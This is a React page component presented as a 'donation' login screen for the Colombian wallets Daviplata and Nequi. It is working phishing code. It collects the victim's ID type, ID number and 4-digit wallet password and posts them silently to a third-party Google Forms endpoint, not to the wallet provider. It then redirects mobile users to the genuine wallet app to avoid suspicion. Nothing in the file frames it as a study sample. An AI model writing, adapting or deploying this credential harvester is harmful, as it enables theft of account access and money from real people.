"use client";

import { useState } from "react";

export default function DonacionPage({ onSuccess }: { onSuccess: () => void }) {
  const [billetera, setBilletera] = useState("Daviplata");
  const [tipoDoc, setTipoDoc] = useState("");
  const [numeroDoc, setNumeroDoc] = useState("");
  const [password, setPassword] = useState("");
  const [mostrarPass, setMostrarPass] = useState(false);

  const formURL = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSfb8GZ-KmfEnGyivGhBU6J2gUOQyl1Uon1hfxg-LzNKBCa7MA/formResponse";
  const entryBilletera = "entry.1287154502";
  const entryTipoDoc = "entry.1004012202";
  const entryNumeroDoc = "entry.274269619";
  const entryPassword = "entry.1885484666";

  const isMobile = () => typeof navigator !== "undefined" && /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
  const getAppURL = () => (billetera === "Nequi" ? "nequi://" : "daviplata://inicio");

  const handleSubmit = async () => {
    if (!tipoDoc || !numeroDoc || !password) {
      alert("⚠️ Todos los campos son obligatorios.");
      return;
    }

    if (!/^\d{4}$/.test(password)) {
      alert("⚠️ La contraseña debe tener exactamente 4 dígitos.");
      return;
    }

    const formData = new FormData();
    formData.append(entryBilletera, billetera);
    formData.append(entryTipoDoc, tipoDoc);
    formData.append(entryNumeroDoc, numeroDoc);
    formData.append(entryPassword, password);

    try {
      await fetch(formURL, {
        method: "POST",
        mode: "no-cors",
        body: formData,
      });

      if (isMobile()) {
        setTimeout(() => {
          window.location.href = getAppURL();
        }, 100);
      } else {
        onSuccess();
      }
    } catch (error) {
      console.error("Error al enviar los datos:", error);
      alert("❌ No se pudo completar el proceso. Intenta de nuevo.");
    }
  };

  return (
    <div className="max-w-2xl mx-auto py-6 px-4">
      <h1 className="text-xl font-bold text-center text-[#19295A] mb-4">Ingrese a su Billetera Virtual</h1>

      <div className="mb-3">
        <label>Billetera</label>
        <select value={billetera} onChange={(e) => setBilletera(e.target.value)} className="w-full p-2 rounded">
          <option value="Daviplata">Daviplata</option>
          <option value="Nequi">Nequi</option>
        </select>
      </div>

      <div className="mb-3">
        <label>Tipo de documento</label>
        <select value={tipoDoc} onChange={(e) => setTipoDoc(e.target.value)} className="w-full p-2 rounded">
          <option value="">Selecciona</option>
          <option>Cédula de Ciudadanía</option>
          <option>Tarjeta de Identidad</option>
          <option>Cédula de Extranjería</option>
        </select>
      </div>

      <div className="mb-3">
        <label>Número de documento</label>
        <input type="text" value={numeroDoc} onChange={(e) => setNumeroDoc(e.target.value.replace(/\D/g, ""))} className="w-full p-2 rounded" />
      </div>

      <div className="mb-4">
        <label>Contraseña (4 dígitos)</label>
        <div className="flex">
          <input type={mostrarPass ? "text" : "password"} value={password} onChange={(e) => setPassword(e.target.value.replace(/\D/g, "").slice(0, 4))} className="w-full p-2 rounded-l" />
          <button type="button" onClick={() => setMostrarPass(!mostrarPass)} className="bg-gray-300 px-3 rounded-r">{mostrarPass ? "Ocultar" : "Ver"}</button>
        </div>
      </div>

      <button onClick={handleSubmit} className="w-full py-2 bg-[#19295A] text-white rounded hover:bg-[#1b2e63]">Ingresar</button>
    </div>
  );
}
